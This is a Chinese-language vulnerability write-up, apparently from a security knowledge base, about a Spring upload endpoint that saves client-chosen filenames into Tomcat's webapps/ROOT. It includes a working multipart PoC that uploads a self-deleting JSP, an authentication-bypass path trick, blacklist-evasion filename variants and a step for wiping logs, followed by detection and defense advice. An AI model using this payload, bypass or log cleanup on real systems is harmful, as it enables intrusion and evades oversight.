---
id: web-generic-file-upload-catalina-webapps-root-original-filename-jsp
title: Spring 上传接口把 getOriginalFilename 拼到 catalina.home/webapps/ROOT：无后缀校验直接落 JSP webshell
type: scenario
domain: web
path: web/generic/file-upload
technique: catalina-webapps-root-original-filename-jsp-upload
aliases:
- catalina.home webapps ROOT 上传
- getOriginalFilename 直接落盘
- 任意后缀上传 JSP
- Tomcat webapps 任意文件写入
- 自删除 JSP webshell
tags:
- file-upload
- java
- spring
- tomcat
- webshell
- unrestricted-upload
- original-filename
- webroot
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V218
  verified_at: '2026-11-07T04:50:25+08:00'
  notes: 已对照原文与图15-18核对：uploadWxFile.do→uploadWxFileToRoot、catalina.home/webapps/ROOT + getOriginalFilename、无后缀校验、test.jsp返回true并执行HelloWorldTest均一致；未复跑。
---

## 一句话结论

Spring 上传接口 `uploadWxFile.do` 把 `MultipartFile` 交给 `uploadWxFileToRoot`，后者用 `System.getProperty("catalina.home") + "/webapps/ROOT/" + file.getOriginalFilename()` 作为落盘路径，既不校验后缀也不处理文件名；攻击者上传 `test.jsp` 就直接写进 Tomcat Web 根，访问即执行，原文示例 JSP 执行后还会自删除以清理痕迹。

## 原理

- **原始文件名完全由客户端控制**：`MultipartFile.getOriginalFilename()` 来自 multipart 请求的 `filename=` 字段，攻击者可以填 `test.jsp`、`../../x.jsp` 等任意值。代码未做扩展名白名单、内容类型检查、文件名规范化或随机重命名。
- **落点固定在 Web 根**：`System.getProperty("catalina.home")` 是 Tomcat 安装目录，拼接 `webapps/ROOT/` 即默认 Web 应用的根目录；Tomcat 会把该目录下的 `.jsp` 当作 JSP 编译执行，因此上传即 getshell。
- **写入逻辑简单**：`new FileOutputStream(tempPath + file.getOriginalFilename())` 后 `IOUtils.copy(file.getInputStream(), os)`，只要应用进程对 `webapps/ROOT` 有写权限（Tomcat 部署常见）就能落盘；没有临时目录、没有二次校验。
- **自删除 JSP**：示例 payload `<% out.print("HelloWorldTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>` 在输出标记后删除自身文件，减少 Web 目录中的持久化证据；但请求仍会留下访问日志。
- **入口与鉴权**：Controller 为 `@RequestMapping("/uploadWxFile.do")` + `@ResponseBody`，接收 `@RequestParam("file") MultipartFile`。原文通过 `/login.jsp/..;/config/uploadWxFile.do` 的路径解析绕过访问到该接口；即使没有绕过，任何能访问该上传功能的账号都可利用。

## 触发条件

- Spring MVC 项目存在接收 `MultipartFile` 的上传接口，且把 `getOriginalFilename()` 直接拼进落盘路径。
- 落点位于 Tomcat `webapps/ROOT`（或其他 Web 可访问目录），应用对该目录有写权限。
- 目标容器会解析上传目录下的 JSP（Tomcat 默认会）。
- 接口可达（外网暴露、低权限账号或配合鉴权绕过）。

## 利用步骤

1. 找到上传接口与实现：搜索 `MultipartFile`、`getOriginalFilename`、`FileOutputStream`、`IOUtils.copy`，确认落点路径。
2. 判断落点是否在 Web 根（`catalina.home/webapps/ROOT`、`webapps/<app>`、`docBase` 等）。
3. 构造 multipart 请求，`filename="test.jsp"`，内容为 JSP 代码（先输出一个标记验证解析，再执行命令）。
4. 发送请求，观察返回（原文返回 `true` 即写入成功）。
5. 访问 `http://target/test.jsp`，确认 JSP 执行；随后可替换为命令执行/内存马 payload。
6. 测试自删除或清理：删除上传文件、Web 访问日志与容器编译缓存（`work/Catalina`）。

## PoC

```http
POST /login.jsp/..;/config/uploadWxFile.do HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydef456
Content-Length: 290
Connection: close

------WebKitFormBoundarydef456
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: application/octet-stream

<% out.print("HelloWorldTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
------WebKitFormBoundarydef456--
```

```text
# 原文响应：HTTP/1.1 200，正文 true
# 访问 http://target/test.jsp 返回 HelloWorldTest（JSP 已执行并自删除）
```

说明：PoC 为原文请求的结构化复现，未在本机执行；原文截图显示上传 `test.jsp` 返回 `true`，访问后输出 `HelloWorldTest`，页面随后因自删除逻辑消失。URL 中 `/login.jsp/..;/` 为原文用于绕过鉴权的路径技巧，上传漏洞本身不依赖该绕过。

## 变体与关联

- 变体（文件名）：`filename` 中带 `../` 可穿越到 Web 根或其他目录；带 `%00`/分号/双后缀可绕过简单黑名单；大小写 `.JSP`、`.jspx`、`.jspf` 视容器解析规则。
- 变体（落点）：`webapps/ROOT`、`webapps/<app>`、Spring Boot 的可执行 jar 解压目录、`docBase`/`upload` 映射到 Web 根的目录。
- 变体（隐蔽）：JSP 自删除、只在内存中注册 Filter/Listener 的内存马、把 payload 写进已存在的 JSP 文件。
- 关联：[[web-generic-file-upload-spring-temppath-original-filename-traversal-jsp]]（tempPath + 原始文件名，靠 `../` 穿越到 webapps）、[[web-generic-file-upload-newbeemall-admin-upload-jsp]]（未校验后缀 + 分号绕过上传 JSP）、[[web-generic-file-upload-xiaozhi-upload-any-extension-webroot]]（无类型校验 + Web 可访问目录，但使用 UUID 重命名）。
- 边界：上传目录不解析 JSP、应用无写权限、容器禁止脚本执行、落点在 Web 根之外且无其他解析入口时，getshell 不成立；仅能写文件仍可能造成覆盖/存储型 XSS。

## 检测与防御

- 检测（文件）：Web 根目录出现新的 `.jsp/.jspx` 文件，尤其是上传时间与 HTTP 上传请求时间吻合；JSP 内容包含 `Runtime`、`ProcessBuilder`、`getRealPath`、自删除逻辑；Tomcat `work/Catalina` 出现对应编译类。
- 检测（访问）：上传接口返回 `true` 后短时间访问同名 JSP；上传请求的 `filename` 含 `.jsp`、`..`、`%00`、分号；同一 IP 上传后立即请求 Web 根路径。
- 防御：扩展名白名单 + 内容类型/魔数校验；使用随机文件名并去掉路径分隔符；上传目录放到 Web 根之外，通过下载接口读取；禁止上传目录执行脚本（Tomcat 配置/反向代理）；应用进程对 Web 目录只读；上传接口加鉴权与权限校验；WAF 兜底。
